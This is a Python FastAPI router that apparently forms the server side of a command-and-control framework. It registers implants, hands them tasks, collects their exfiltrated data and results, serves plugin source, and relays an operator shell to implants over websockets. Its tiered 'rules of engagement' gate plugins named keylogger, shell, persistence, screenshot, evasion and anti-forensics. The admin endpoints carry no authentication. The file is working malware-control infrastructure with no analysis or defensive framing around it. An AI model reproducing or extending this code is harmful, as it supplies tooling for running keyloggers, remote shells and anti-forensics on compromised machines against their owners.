from fastapi import APIRouter, Depends, HTTPException, Body, WebSocket, WebSocketDisconnect
from sqlalchemy.orm import Session
from typing import List, Dict
import os
import uuid

from . import models, security
from .database import SessionLocal
from .comms import manager

router = APIRouter()

# --- Dependency ---
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# ==============================================================================
# ROE (Rules of Engagement) Logic
# ==============================================================================
ROE_GATES = {
    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler", "persistence", "screenshot", "update", "temp_plugin", "evasion", "anti_forensics"],
    2: ["keylogger", "filesystem", "dummy", "system_profiler", "screenshot"],
    3: [],
}

def check_roe(db: Session, implant_id: str, command: str, args: Dict) -> bool:
    if command != "start_plugin": return True
    plugin_name = args.get("plugin_name")
    if not plugin_name: return False
    implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
    if not implant: return False
    return plugin_name in ROE_GATES.get(implant.roe_tier, [])

# ==============================================================================
# API Endpoints
# ==============================================================================

@router.post("/register", response_model=models.RegistrationResponse)
def register_implant(registration: models.ImplantBase, db: Session = Depends(get_db)):
    implant_id = str(uuid.uuid4())
    db_implant = models.Implant(id=implant_id, **registration.model_dump())
    db.add(db_implant)
    db.commit()
    db.refresh(db_implant)

    token = security.create_access_token(data={"sub": implant_id})
    return {"implant_id": implant_id, "token": token}

@router.get("/tasks", response_model=models.TaskResponse)
def get_tasks(db: Session = Depends(get_db), current_implant_id: str = Depends(security.get_current_implant_id)):
    tasks_from_db = db.query(models.Task).filter(
        models.Task.implant_id == current_implant_id,
        models.Task.status == "pending"
    ).all()
    task_schemas = [models.TaskSchema.from_orm(task) for task in tasks_from_db]

    # Mark tasks as dispatched instead of deleting them
    for task in tasks_from_db:
        task.status = "dispatched"
    db.commit()

    return {"tasks": task_schemas}

@router.post("/data")
def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
    print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
    return {"status": "received"}

@router.post("/tasks/result")
def submit_task_result(payload: models.TaskResult, db: Session = Depends(get_db), current_implant_id: str = Depends(security.get_current_implant_id)):
    task = db.query(models.Task).filter(models.Task.id == payload.task_id, models.Task.implant_id == current_implant_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not owned by this implant")

    task.result = payload.result
    task.status = "completed"
    db.commit()

    return {"status": "result recorded"}

@router.get("/admin/implants", response_model=List[models.ImplantSchema])
def list_implants(db: Session = Depends(get_db)):
    return db.query(models.Implant).all()

@router.post("/admin/tasks/{implant_id}", response_model=models.TaskSchema)
def add_task(implant_id: str, task: models.TaskCreate, db: Session = Depends(get_db)):
    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Implant not found")
    if not check_roe(db, implant_id, task.command, task.args):
        raise HTTPException(status_code=403, detail="ROE VIOLATION")
    db_task = models.Task(**task.model_dump(), implant_id=implant_id)
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task

@router.get("/admin/tasks/{implant_id}", response_model=List[models.TaskSchema])
def get_implant_tasks(implant_id: str, db: Session = Depends(get_db)):
    # First, check if the implant exists
    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Implant not found")

    # Then, return its tasks
    tasks = db.query(models.Task).filter(models.Task.implant_id == implant_id).all()
    return tasks

@router.put("/admin/tier/{implant_id}/{tier}", response_model=models.ImplantSchema)
def set_implant_tier(implant_id: str, tier: int, db: Session = Depends(get_db)):
    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Implant not found")
    if tier not in ROE_GATES:
        raise HTTPException(status_code=400, detail="Invalid tier")
    db_implant.roe_tier = tier
    db.commit()
    db.refresh(db_implant)
    return db_implant

@router.get("/admin/plugins/{plugin_name}", response_model=Dict)
def get_plugin_source(plugin_name: str):
    if not plugin_name.isalnum() or ".." in plugin_name:
        raise HTTPException(status_code=400, detail="Invalid plugin name.")
    plugin_path = os.path.join("crawler", "implant", "plugins", f"{plugin_name}.py")
    try:
        with open(plugin_path, "r") as f:
            source_code = f.read()
        return {"plugin_name": plugin_name, "source_code": source_code}
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail=f"Plugin '{plugin_name}' not found.")

@router.websocket("/ws/implant/{implant_id}")
async def websocket_implant_endpoint(websocket: WebSocket, implant_id: str):
    db = SessionLocal()
    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
    db.close()
    if not db_implant:
        await websocket.close(code=1008)
        return
    await manager.connect_implant(websocket, implant_id)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.send_to_operator(data, implant_id)
    except WebSocketDisconnect:
        manager.disconnect_implant(implant_id)

@router.websocket("/ws/cli/{implant_id}")
async def websocket_cli_endpoint(websocket: WebSocket, implant_id: str):
    db = SessionLocal()
    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
    db.close()
    if not db_implant:
        await websocket.close(code=1008)
        return
    await manager.connect_operator(websocket, implant_id)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.send_to_implant(data, implant_id)
    except WebSocketDisconnect:
        manager.disconnect_operator(implant_id)
